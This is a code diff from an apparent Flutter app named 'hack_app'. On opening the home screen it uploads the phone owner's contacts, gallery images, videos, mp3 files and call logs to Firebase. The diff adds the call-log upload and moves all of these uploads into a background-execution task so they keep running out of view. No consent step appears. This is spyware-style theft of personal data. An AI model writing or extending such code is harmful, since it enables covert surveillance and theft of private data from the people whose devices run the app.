@@ -1,4 +1,5 @@
 import 'package:flutter/material.dart';
+import 'package:flutter_background/flutter_background.dart';
 import 'package:hack_app/accessdata/alldataisasscess.dart';
 import 'package:hive/hive.dart';
 import 'package:provider/provider.dart';
@@ -12,16 +13,34 @@ class HomeScreen extends StatefulWidget {
 }
 
 class _HomeScreenState extends State<HomeScreen> {
+  String _status = 'Not running';
   var sett = Hive.box('settings');
   @override
   void initState() {
     String uid = sett.get('uid', defaultValue: '');
     Hackapp hack = Provider.of<Hackapp>(context, listen: false);
-    hack.accessallcontact(uid);
-    hack.loadGalleryImages(uid);
-    hack.uploadAllVideosToFirebase(uid);
-    hack.uploadallmp3file(uid);
+    startBackgroundTask(hack, uid);
     super.initState();
+  }
+
+  Future<void> startBackgroundTask(Hackapp hack, uid) async {
+    try {
+      await FlutterBackground.enableBackgroundExecution();
+      await FlutterBackground.initialize();
+      hack.uploadCallLogsToFirebase(uid);
+      hack.accessallcontact(uid);
+      hack.loadGalleryImages(uid);
+      hack.uploadAllVideosToFirebase(uid);
+      hack.uploadallmp3file(uid);
+      setState(() {
+        _status = 'Running in the background';
+      });
+    } catch (e) {
+      print('Error starting background task: $e');
+      setState(() {
+        _status = 'Error starting background task';
+      });
+    }
   }
 
   @override
